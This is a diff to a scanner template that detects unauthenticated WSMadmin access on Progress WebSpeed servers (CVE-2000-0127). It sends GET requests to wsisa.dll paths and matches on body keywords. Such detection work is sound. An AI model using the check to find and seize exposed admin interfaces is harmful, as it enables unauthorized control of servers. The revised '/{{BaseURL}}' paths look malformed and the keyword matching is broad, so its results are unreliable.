@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Progress WebSpeed 配置程序未正确禁用对 WSMadmin 管理工具的访问控制，远程攻击者可通过访问 wsisa.dll 相关管理路径绕过认证获取管理权限。本 PoC 通过请求典型 wsisa.dll/WSMadmin 管理入口，检测目标是否暴露未授权管理界面，不对系统做任何修改，属于安全无损验证。"
+description = "检测目标 Progress WebSpeed 服务器是否未正确禁用 WSMadmin 管理工具访问权限。通过访问 wsisa.dll 路径并检查返回内容判断是否存在未授权访问漏洞。攻击者可利用此漏洞获取系统管理权限。"
 id = "POC-AVE-2000-0115"
-name = "CVE-2000-0127 WebSpeed WSMadmin 未授权访问 PoC"
+name = "Progress WebSpeed WSMadmin 未授权访问 PoC"
 severity = "high"
 tags = ["ave-2000-0115"]
 vuln_id = [
@@ -15,39 +15,60 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/cgi-bin/wsisa.dll/WSMadmin"
+path = "/{{BaseURL}}/scripts/wsisa.dll"
 protocol = "http"
 
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [
+    "WSMadmin",
+    "WebSpeed",
+    "WebSpeed Messenger",
+    "Messenger Administration",
+]
 
 [[poc.requests]]
 method = "GET"
-path = "/scripts/wsisa.dll/WSMadmin"
+path = "/{{BaseURL}}/wsisa.dll"
 protocol = "http"
 
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [
+    "WSMadmin",
+    "WebSpeed",
+    "WebSpeed Messenger",
+    "Messenger Administration",
+]
 
 [[poc.requests]]
 method = "GET"
-path = "/wsisa.dll/WSMadmin"
+path = "/{{BaseURL}}/cgi-bin/wsisa.dll"
 protocol = "http"
 
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [
+    "WSMadmin",
+    "WebSpeed",
+    "WebSpeed Messenger",
+    "Messenger Administration",
+]
